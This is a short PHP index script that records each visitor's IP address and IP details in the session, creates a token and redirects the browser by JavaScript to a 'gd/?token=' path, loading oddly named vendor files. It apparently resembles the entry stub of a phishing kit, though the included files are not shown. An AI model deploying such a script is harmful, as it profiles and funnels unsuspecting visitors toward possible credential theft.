<?php
require_once 'Vendor/Modernized.php';
require_once 'Vendor/Pullers.php';
require_once 'Vendor/Laravel.php';

$Modernizeds = new Modernized;
$Pullers = new Pullers;

$_SESSION['ip'] = $Modernizeds->getIP();
$_SESSION['ipDetails'] = $Modernizeds->getIPDetails();
$matok = $Modernizeds->createToken();
echo'<script>window.location.href="gd/?token='.$matok.'";</script>';
?>

